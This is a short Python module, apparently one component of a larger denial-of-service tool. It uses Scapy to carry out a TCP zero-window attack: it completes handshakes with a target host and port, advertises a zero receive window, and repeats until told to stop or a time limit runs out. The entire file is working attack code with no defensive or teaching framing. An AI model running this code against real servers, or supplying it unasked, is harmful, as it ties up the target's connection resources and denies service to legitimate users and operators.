from scapy.all import IP, TCP, send, sr1, RandShort, RandInt
import time

def launch(target_ip, port, duration, tag, stop_event, fail_tracker):
    start_time = time.time()
    failed = 0
    connections_sent = 0

    while not stop_event.is_set():
        # Exit if time limit reached
        if duration and (time.time() - start_time) > duration:
            break

        try:
            sport = RandShort()
            seq = RandInt()
            window_size = 0  # Critical for 0-window attack

            ip = IP(dst=target_ip)
            syn = TCP(sport=sport, dport=port, flags='S', seq=seq)
            synack = sr1(ip/syn, timeout=0.2, verbose=0)  # Slightly relaxed timeout

            if synack and synack.haslayer(TCP) and synack.getlayer(TCP).flags == 'SA':
                ack = TCP(
                    sport=sport,
                    dport=port,
                    flags='A',
                    seq=seq + 1,
                    ack=synack.seq + 1,
                    window=window_size
                )
                send(ip/ack, verbose=0)
                connections_sent += 1

        except Exception as e:
            failed += 1
            if failed > 10:
                print(f"[!] Too many failures in {tag}: {e}")
                fail_tracker[tag] = True
                stop_event.set()
                break

        # Small sleep to avoid CPU overuse and respect stop_event
        time.sleep(0.01)

    print(f"[i] {tag} completed — Sent {connections_sent} 0-window TCP sessions.")
